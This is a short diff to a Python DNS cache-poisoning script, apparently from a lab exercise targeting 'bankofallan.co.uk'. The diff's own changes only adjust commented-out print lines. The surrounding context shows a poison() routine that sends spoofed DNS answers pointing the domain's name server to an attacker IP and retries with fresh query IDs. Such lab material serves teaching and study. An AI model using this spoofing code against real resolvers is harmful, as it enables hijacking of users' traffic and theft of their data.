@@ -26,6 +26,7 @@ def get_qid_and_port(badguy_IP, DNS_IP):
 	data = DNSRecord.parse(data)
 	qid = data.header.id
 	socket_receive.close()
+	#print
 	#print "QUERY ID: %s ; SOURCE PORT: %s" % (qid, src_port)
 	return (qid, src_port)
 
@@ -45,7 +46,7 @@ def get_ns(DNS_IP):
 	ns_IP = str(answer.rdata)
 	ns_hostname = str(answer.rname)[:-1]
 	socket_send.close()
-	#print "The name server for ns.bankofallan.co.uk is at %s" % ns
+	#print "The name server %s is at %s" % (ns_hostname,ns_IP)
 	#print
 	return (ns_IP, ns_hostname)
 
@@ -91,6 +92,8 @@ def poison(badguy_IP, DNS_IP):
 			answer.add_auth(RR("bankofallan.co.uk",QTYPE.NS,rdata=NS(ns_hostname),ttl=4800))
 			answer.add_ar(RR(ns_hostname,QTYPE.A,rdata=A(badguy_IP),ttl=4800))
 			sock_spoof.send(answer.pack())
+			#print answer
+			#print
 		#GET NEW QUERY ID AND TRY AGAIN
 		qid, port = get_qid_and_port(badguy_IP, DNS_IP)
 
